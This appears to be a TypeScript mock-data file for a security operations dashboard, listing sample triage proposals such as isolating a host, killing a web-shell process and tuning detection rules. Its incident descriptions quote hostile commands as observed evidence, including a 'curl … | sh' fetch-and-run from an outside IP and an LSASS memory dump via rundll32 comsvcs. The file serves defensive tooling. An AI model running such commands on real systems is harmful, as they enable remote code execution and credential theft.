export type QueueCategory = 'respond' | 'investigate' | 'configure' | 'closed';

export interface Proposal {
  id: string;
  category: QueueCategory;
  title: string;
  summary: string;
  createdAt: string;
  assignees: string[];
  worker: string;
  watch: string;
  confidence: number;
  recommendedAction: string;
  entities: Array<{ id: string; type: 'host' | 'user' | 'ip' | 'rule' }>;
  relatedAlertIds: string[];
  conversationId?: string;
  outcome?: 'Approved' | 'Dismissed' | 'Applied automatically';
  severity: 'low' | 'medium' | 'high' | 'critical';
  whatHappened: string[];
}

const NOW = new Date('2026-10-19T14:05:00.000Z').getTime();
const minutesAgo = (minutes: number) => new Date(NOW - minutes * 60_000).toISOString();
const hoursAgo = (hours: number) => minutesAgo(hours * 60);

export const QUEUE_LABELS: Record<QueueCategory, string> = {
  respond: 'Respond',
  investigate: 'Investigate',
  configure: 'Configure',
  closed: 'Closed Actions',
};

export const QUEUE_COLORS: Record<QueueCategory, 'danger' | 'warning' | 'primary' | 'hollow'> = {
  respond: 'danger',
  investigate: 'warning',
  configure: 'primary',
  closed: 'hollow',
};

export const PROPOSALS: Proposal[] = [
  {
    id: 'p-001',
    category: 'respond',
    title: 'Isolate win-fin-07 — credential dumping following macro-launched PowerShell',
    summary:
      'Floor › Alert Triage linked 3 alerts into one intrusion (encoded PowerShell → LSASS dump → Kerberoasting). Proposes host isolation and credential reset for j.alvarez.',
    createdAt: minutesAgo(7),
    assignees: ['u_pavel'],
    worker: 'Alert Triage',
    watch: 'Floor',
    confidence: 0.94,
    recommendedAction: 'Isolate host',
    entities: [
      { id: 'win-fin-07', type: 'host' },
      { id: 'j.alvarez', type: 'user' },
      { id: '198.51.100.22', type: 'ip' },
    ],
    relatedAlertIds: ['alert-001', 'alert-006', 'alert-002'],
    conversationId: 'conv-fin07-powershell',
    severity: 'critical',
    whatHappened: [
      'A macro in Q3_Invoice_Summary.docm launched hidden, Base64-encoded PowerShell.',
      'The decoded payload downloaded a.ps1 from 198.51.100.22 (threat intel match).',
      'rundll32 comsvcs MiniDump created C:\\Users\\Public\\lsass.dmp.',
      '27 RC4 service ticket requests to srv-dc-01 followed within the hour.',
    ],
  },
  {
    id: 'p-002',
    category: 'respond',
    title: 'Block 203.0.113.80 and kill the php-fpm child shell on lnx-web-03',
    summary:
      'Web shell on lnx-web-03 is fetching a second stage from 203.0.113.80. Proposes killing PID 24119 and adding the IP to the edge blocklist.',
    createdAt: minutesAgo(25),
    assignees: ['u_ana'],
    worker: 'Alert Triage',
    watch: 'Floor',
    confidence: 0.88,
    recommendedAction: 'Kill process',
    entities: [
      { id: 'lnx-web-03', type: 'host' },
      { id: 'www-data', type: 'user' },
      { id: '203.0.113.80', type: 'ip' },
    ],
    relatedAlertIds: ['alert-003', 'alert-012'],
    severity: 'high',
    whatHappened: [
      'php-fpm8.1 spawned bash -c "curl -s http://203.0.113.80/x.sh | sh".',
      'The same parent spawned 2 further shells in the last 3 hours.',
    ],
  },
  {
    id: 'p-003',
    category: 'investigate',
    title: 'Confirm r.kim SSH logins from Tor exit nodes are expected',
    summary:
      'Hunt › Continuous Threat Hunt found 3 successful SSH logins to mac-eng-22 from Tor exit nodes with no preceding failures. Needs user confirmation before closing.',
    createdAt: minutesAgo(52),
    assignees: [],
    worker: 'Continuous Threat Hunt',
    watch: 'Hunt',
    confidence: 0.71,
    recommendedAction: 'Escalate',
    entities: [
      { id: 'mac-eng-22', type: 'host' },
      { id: 'r.kim', type: 'user' },
      { id: '185.220.101.4', type: 'ip' },
    ],
    relatedAlertIds: ['alert-004', 'alert-008'],
    conversationId: 'conv-hunt-ssh',
    severity: 'medium',
    whatHappened: [
      '3 successful SSH logins from 185.220.101.x (Tor) over 9 days.',
      'No failed authentication attempts preceded the logins.',
    ],
  },
  {
    id: 'p-004',
    category: 'investigate',
    title: 'Attack discovery: possible intrusion chain across win-fin-07 and srv-dc-01',
    summary:
      'Floor › Attack Discovery grouped 6 alerts into one attack. Review the generated attack chain and decide whether to open a case.',
    createdAt: hoursAgo(1.5),
    assignees: ['u_lee'],
    worker: 'Attack Discovery',
    watch: 'Floor',
    confidence: 0.83,
    recommendedAction: 'Open case',
    entities: [
      { id: 'win-fin-07', type: 'host' },
      { id: 'srv-dc-01', type: 'host' },
      { id: 'administrator', type: 'user' },
    ],
    relatedAlertIds: ['alert-001', 'alert-002', 'alert-006', 'alert-010'],
    conversationId: 'conv-kerberoast',
    severity: 'critical',
    whatHappened: [
      'Initial access via macro document, execution via encoded PowerShell.',
      'Credential access via LSASS dump and Kerberoasting against the domain controller.',
    ],
  },
  {
    id: 'p-005',
    category: 'investigate',
    title: 'Sudoers change on lnx-ci-runner-12 outside the deployment window',
    summary:
      'ci-bot edited /etc/sudoers.d/ci-bot interactively with vim at 13:13 UTC. Ansible runs happen at 02:00 UTC only.',
    createdAt: hoursAgo(2.2),
    assignees: ['u_sam'],
    worker: 'Alert Triage',
    watch: 'Floor',
    confidence: 0.62,
    recommendedAction: 'Investigate',
    entities: [
      { id: 'lnx-ci-runner-12', type: 'host' },
      { id: 'ci-bot', type: 'user' },
    ],
    relatedAlertIds: ['alert-005', 'alert-011'],
    severity: 'low',
    whatHappened: ['Interactive vim session modified a sudoers drop-in file.'],
  },
  {
    id: 'p-006',
    category: 'configure',
    title: 'Add rule exception: image-resizing cron on lnx-web-03 trips the web shell rule',
    summary:
      'Detection › Rule Tuning found 212 of 214 alerts from this rule in 7 days are /usr/bin/convert under /var/www/app/cron. Proposes an exception.',
    createdAt: hoursAgo(3),
    assignees: [],
    worker: 'Rule Tuning',
    watch: 'Detection',
    confidence: 0.97,
    recommendedAction: 'Add rule exception',
    entities: [
      { id: 'lnx-web-03', type: 'host' },
      { id: 'Web Shell Detection', type: 'rule' },
    ],
    relatedAlertIds: ['alert-003'],
    conversationId: 'conv-rule-webshell',
    severity: 'low',
    whatHappened: ['99% of this rule’s alerts match a single benign command line.'],
  },
  {
    id: 'p-007',
    category: 'closed',
    title: 'Close 14 duplicate "Unusual Source IP" alerts for VPN egress change',
    summary: 'New VPN egress range 203.0.113.0/26 rolled out Monday; alerts were duplicates.',
    createdAt: hoursAgo(5),
    assignees: ['u_ana'],
    worker: 'Alert Triage',
    watch: 'Floor',
    confidence: 0.91,
    recommendedAction: 'Close alerts as false positive',
    entities: [{ id: 'Unusual Source IP for a User to Logon from', type: 'rule' }],
    relatedAlertIds: ['alert-013', 'alert-017'],
    outcome: 'Approved',
    severity: 'low',
    whatHappened: ['14 alerts shared the same new source range.'],
  },
  {
    id: 'p-008',
    category: 'closed',
    title: 'Enable prebuilt rule "Suspicious MS Office Child Process"',
    summary: 'Coverage review found no rule covering T1566.001 child processes of Office apps.',
    createdAt: hoursAgo(9),
    assignees: [],
    worker: 'Rule Coverage',
    watch: 'Detection',
    confidence: 0.89,
    recommendedAction: 'Install prebuilt rule',
    entities: [{ id: 'Suspicious MS Office Child Process', type: 'rule' }],
    relatedAlertIds: [],
    outcome: 'Applied automatically',
    severity: 'medium',
    whatHappened: ['Coverage gap for Phishing: Spearphishing Attachment.'],
  },
  {
    id: 'p-009',
    category: 'closed',
    title: 'Memory dump of lsass.exe on win-fin-07 for forensics',
    summary: 'Forensics worker proposed a memory capture before isolation. Dismissed: isolation came first.',
    createdAt: hoursAgo(18),
    assignees: ['u_pavel'],
    worker: 'Endpoint Analysis',
    watch: 'Forensics',
    confidence: 0.76,
    recommendedAction: 'Memory dump',
    entities: [{ id: 'win-fin-07', type: 'host' }],
    relatedAlertIds: ['alert-006'],
    outcome: 'Dismissed',
    severity: 'high',
    whatHappened: ['Analyst preferred isolation first.'],
  },
  {
    id: 'p-010',
    category: 'closed',
    title: 'Suppress "Sudoers File Modification" during Ansible window (02:00–02:30 UTC)',
    summary: 'Rule tuning proposed a scheduled suppression; approved by Sam Chen.',
    createdAt: hoursAgo(40),
    assignees: ['u_sam'],
    worker: 'Rule Tuning',
    watch: 'Detection',
    confidence: 0.93,
    recommendedAction: 'Edit detection rule',
    entities: [{ id: 'Sudoers File Modification', type: 'rule' }],
    relatedAlertIds: [],
    outcome: 'Approved',
    severity: 'low',
    whatHappened: ['All 31 alerts in 30 days occurred during the Ansible window.'],
  },
];

export const TREND_PANELS = [
  { id: 'respond', label: 'Respond', color: '#E7664C' },
  { id: 'investigate', label: 'Investigate', color: '#D6BF57' },
  { id: 'configure', label: 'Configure', color: '#61A2FF' },
] as const;

/** 24 hourly buckets, oldest first. */
export const TREND_SERIES: Record<'respond' | 'investigate' | 'configure', number[]> = {
  respond: [0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 2, 2, 1, 1, 1, 2, 2, 3, 2, 2],
  investigate: [1, 1, 1, 2, 2, 1, 1, 1, 2, 2, 2, 1, 1, 1, 2, 3, 3, 2, 2, 3, 3, 3, 3, 3],
  configure: [0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1],
};

export const WATCHES = [
  { id: 'floor', name: 'Floor', workers: ['Alert Triage', 'Attack Discovery'], enabled: 2 },
  { id: 'hunt', name: 'Hunt', workers: ['Continuous Threat Hunt'], enabled: 1 },
  { id: 'detection', name: 'Detection', workers: ['Rule Tuning', 'Rule Coverage'], enabled: 2 },
  { id: 'forensics', name: 'Forensics', workers: ['Endpoint Analysis'], enabled: 0 },
];

export const impactPills = (proposals: Proposal[]) => {
  const counts = new Map<string, { id: string; type: Proposal['entities'][number]['type']; count: number }>();
  for (const proposal of proposals) {
    if (proposal.category === 'closed') continue;
    for (const entity of proposal.entities) {
      const existing = counts.get(entity.id);
      if (existing) existing.count += 1;
      else counts.set(entity.id, { ...entity, count: 1 });
    }
  }
  return [...counts.values()].sort((a, b) => b.count - a.count);
};
